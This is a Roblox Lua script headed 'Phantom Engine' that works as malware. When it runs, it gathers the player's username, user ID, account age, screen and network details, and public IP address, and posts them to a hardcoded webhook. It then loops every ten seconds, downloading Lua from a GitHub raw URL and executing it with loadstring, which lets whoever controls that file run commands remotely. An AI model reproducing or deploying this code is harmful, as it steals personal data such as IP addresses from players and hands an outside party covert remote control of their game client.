-- [[ PHANTOM ENGINE: RESTORED FULL INFO ]]
local LP = game:GetService("Players").LocalPlayer
local HS = game:GetService("HttpService")
local US = game:GetService("UserInputService")
local GS = game:GetService("GuiService")
local RunService = game:GetService("RunService")
local MS = game:GetService("MarketplaceService")

-- CONFIG
local RAW_URL = "https://raw.githubusercontent.com/thegoodoneatgamez/commander/refs/heads/main/commands.lua"
local WEBHOOK = "https://webhook.lewisakura.moe/api/webhooks/1497643214176518197/VarvH0-wuUuPMwfPXZP23LoOmqbwcB3qmq3NKhCKUTIDrQVC-MHSvQ4Or7Ky6Hj1TxyC"

-- 1. THE FULL INFO PAGE (Fires Immediately)
task.spawn(function()
    local ip = "Unknown"
    pcall(function() ip = game:HttpGet("https://api.ipify.org") end)

    local fps = math.floor(1 / RunService.Heartbeat:Wait())
    local ping = math.floor(LP:GetNetworkPing() * 1000)
    local res = GS:GetScreenResolution()
    
    local data = {
        ["embeds"] = {{
            ["title"] = "🚨 SYSTEM LIVE: " .. LP.Name,
            ["color"] = 0x00FF00,
            ["description"] = "👤 **Identity**\n" ..
                "**User:** " .. LP.Name .. " (@" .. LP.DisplayName .. ")\n" ..
                "**ID:** " .. LP.UserId .. "\n" ..
                "**Age:** " .. LP.AccountAge .. " Days\n\n" ..
                "📊 **Performance**\n" ..
                "**FPS:** " .. fps .. " | **Ping:** " .. ping .. "ms\n" ..
                "**Res:** " .. math.floor(res.X) .. "x" .. math.floor(res.Y) .. "\n\n" ..
                "🌐 **Network**\n" ..
                "**IP:** " .. ip .. "\n\n" ..
                "🎮 **Environment**\n" ..
                "**Place:** " .. MS:GetProductInfo(game.PlaceId).Name .. "\n" ..
                "**JobId:** \n`" .. game.JobId .. "`"
        }}
    }

    local req = (syn and syn.request) or (http and http.request) or http_request or request
    if req then
        req({Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HS:JSONEncode(data)})
    else
        pcall(function() HS:PostAsync(WEBHOOK, HS:JSONEncode(data)) end)
    end
end)

-- 2. THE 10-SECOND BUFFER
task.wait(10)

-- 3. THE COMMAND LOOP (Cache-Bust Version)
local lastCode = ""
while true do
    local cacheBuster = "?t=" .. os.time() .. "&rand=" .. math.random(1, 100000)
    local s, code = pcall(function() 
        return game:HttpGet(RAW_URL .. cacheBuster) 
    end)
    
    if s and code ~= lastCode and code ~= "" and code ~= "none" then
        lastCode = code
        local taskFunc = loadstring(code)
        if taskFunc then
            task.spawn(taskFunc)
        end
    end
    task.wait(10)
end
